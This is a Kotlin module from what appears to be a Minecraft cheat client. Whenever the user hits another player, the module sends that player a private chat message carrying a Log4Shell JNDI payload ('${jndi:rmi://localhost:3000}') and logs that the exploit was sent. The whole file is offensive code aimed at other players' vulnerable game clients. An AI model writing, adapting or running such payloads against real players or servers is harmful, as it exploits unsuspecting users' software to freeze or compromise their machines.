package net.aspw.client.features.module.impl.combat

import net.aspw.client.event.AttackEvent
import net.aspw.client.event.EventTarget
import net.aspw.client.features.module.Module
import net.aspw.client.features.module.ModuleCategory
import net.aspw.client.features.module.ModuleInfo
import net.aspw.client.value.BoolValue
import net.minecraft.entity.player.EntityPlayer

@ModuleInfo(name = "AttackFreeze", spacedName = "Attack Freeze", description = "", category = ModuleCategory.COMBAT)
class AttackFreeze : Module() {
    private val debug = BoolValue("Debug", true)

    @EventTarget
    fun onAttack(event: AttackEvent) {
        if (event.targetEntity is EntityPlayer) {
            val player = event.targetEntity
            mc.thePlayer.sendChatMessage("/msg " + player.name + " \${jndi:rmi://localhost:3000}")
            if (debug.get())
                chat("Sent log4j exploit to " + player.name + "!")
        }
    }
}